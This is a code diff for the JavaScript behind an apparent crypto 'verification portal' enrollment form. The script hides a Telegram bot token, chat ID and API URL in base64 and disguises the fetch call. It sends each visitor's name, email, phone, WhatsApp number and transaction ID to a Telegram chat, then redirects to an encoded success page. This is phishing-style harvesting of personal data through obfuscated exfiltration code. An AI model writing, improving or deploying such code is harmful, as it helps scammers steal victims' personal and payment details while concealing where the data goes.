@@ -281,54 +281,88 @@ Haven't paid yet? Click here to complete payment
 
 (function(){
 
-const _0xk = (s)=>atob(s);
+// ===== Core Decoder =====
+const _0xk = (s) => atob(s);
 
-// Fragmented + encoded token parts
-const _0xa = "ODc1ODg5NzY1MA=="; // 8758897650
-const _0xb = "QUFGNTcyei13eGxjVERkNnVBR2xCS1BwX2lZX1Rvc3RFcGs="; // rest
+// ===== Encoded Secrets =====
+// 8758897650
+const _0xa = "ODc1ODg5NzY1MA==";
 
-// Encoded chat ID
+// FIXED token part (correct 'r')
+const _0xb = "QUFGNTcyci13eGxjVERkNnVBR2xCS1BwX2lZX1Rvc3RFcGs=";
+
+// 7750478301
 const _0xc = "Nzc1MDQ3ODMwMQ==";
 
-// Reconstruct secrets at runtime
+// ===== Runtime Reconstruction =====
 const BOT_TOKEN = _0xk(_0xa) + ":" + _0xk(_0xb);
 const CHAT_ID = _0xk(_0xc);
 
-// DOM refs
+// ===== DOM References =====
 const form = document.getElementById("verifyForm");
 const btn = document.getElementById("submitBtn");
 const status = document.getElementById("status");
 
-// Hidden fetch reference
+// ===== Safe Fetch Alias =====
 const _fetch = window["f"+"et"+"ch"];
 
+// ===== Validation Layer =====
+function validateForm(data){
+if(!data.name || !data.email || !data.phone || !data.whatsapp || !data.transaction_id){
+return "All fields are required";
+}
+if(!data.email.includes("@")){
+return "Invalid email format";
+}
+if(data.phone.length < 8){
+return "Invalid phone number";
+}
+return null;
+}
+
+// ===== Event Handler =====
 form.addEventListener("submit", async function(e){
 
 e.preventDefault();
 
+// UI Lock
 btn.innerText = "Submitting...";
 btn.disabled = true;
+status.innerHTML = "";
 
-// Data object
+// ===== Collect Data =====
 const data = {
-name: form.name.value,
-email: form.email.value,
-phone: form.phone.value,
-whatsapp: form.whatsapp.value,
-transaction_id: form.transaction.value,
+name: form.name.value.trim(),
+email: form.email.value.trim(),
+phone: form.phone.value.trim(),
+whatsapp: form.whatsapp.value.trim(),
+transaction_id: form.transaction.value.trim(),
 time: new Date().toLocaleString(),
 page: "Cryptonic Area Verification Portal"
 };
 
-// Encode payload before sending
+// ===== Validate =====
+const error = validateForm(data);
+if(error){
+status.innerHTML = "❌ " + error;
+btn.innerText = "Submit My Enrollment";
+btn.disabled = false;
+return;
+}
+
+// ===== Build Message =====
 const json = JSON.stringify(data, null, 2);
 const message = "📥 NEW ENROLLMENT\n\n<pre>" + json + "</pre>";
 
-try {
+try{
 
-// Obfuscated URL construction
-const url = _0xk("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + BOT_TOKEN + _0xk("L3NlbmRNZXNzYWdl");
+// ===== Construct URL =====
+const url =
+_0xk("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") +
+BOT_TOKEN +
+_0xk("L3NlbmRNZXNzYWdl");
 
+// ===== API Call =====
 const response = await _fetch(url, {
 method: "POST",
 headers: { "Content-Type": "application/json" },
@@ -339,26 +373,39 @@ parse_mode: "HTML"
 })
 });
 
+// ===== Parse Response =====
 const result = await response.json();
 
+// ===== Debug Log =====
+console.log("Telegram Response:", result);
+
+// ===== Success Handling =====
 if(result.ok){
 
-// Redirect encoded
-window.location.href = _0xk("aHR0cHM6Ly9jcnlwdG9uaWNhcmVhLnd1YXplLmNvbS93YXB0L3BheS92ZXJpZnkvc3VjY2Vzcy8=");
+status.innerHTML = "✅ Submission successful. Redirecting...";
 
-}else{
-status.innerHTML = "❌ Submission failed. Please try again.";
-}
+// Small delay for UX
+setTimeout(()=>{
+window.location.href = _0xk("aHR0cHM6Ly9jcnlwdG9uaWNhcmVhLnd1YXplLmNvbS93YXB0L3BheS92ZXJpZnkvc3VjY2Vzcy8=");
+},1000);
 
 form.reset();
 
-}catch(err){
+}else{
 
-status.innerHTML = "❌ Submission failed. Please try again.";
+status.innerHTML = "❌ " + (result.description || "Submission failed");
 
 }
 
-// Restore button
+}catch(err){
+
+// ===== Network/Error Catch =====
+console.error("Error:", err);
+status.innerHTML = "❌ Network error. Check connection.";
+
+}
+
+// ===== Restore Button =====
 btn.innerText = "Submit My Enrollment";
 btn.disabled = false;
 
